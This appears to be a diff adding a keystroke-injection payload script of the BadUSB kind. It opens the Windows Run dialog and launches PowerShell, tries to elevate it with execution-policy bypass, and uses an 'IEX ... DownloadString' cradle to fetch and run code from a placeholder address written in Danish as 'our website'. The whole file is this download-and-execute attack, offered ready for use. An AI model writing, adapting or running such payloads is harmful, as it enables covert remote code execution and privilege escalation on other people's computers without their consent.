@@ -1,0 +1,14 @@
+powershell -c "start-process powershell -verb runas -argumentlist '-ex bypass'"
+<enter>
+IEX (New-Object Net.WebClient).DownloadString('https:// vores hjemmeside')
+<enter>
+<end>
+
+
+
+<windows+r>
+powershell
+<enter>
+
+IEX (New-Object Net.WebClient).DownloadString('https://vores hjemmeside')
+<end>
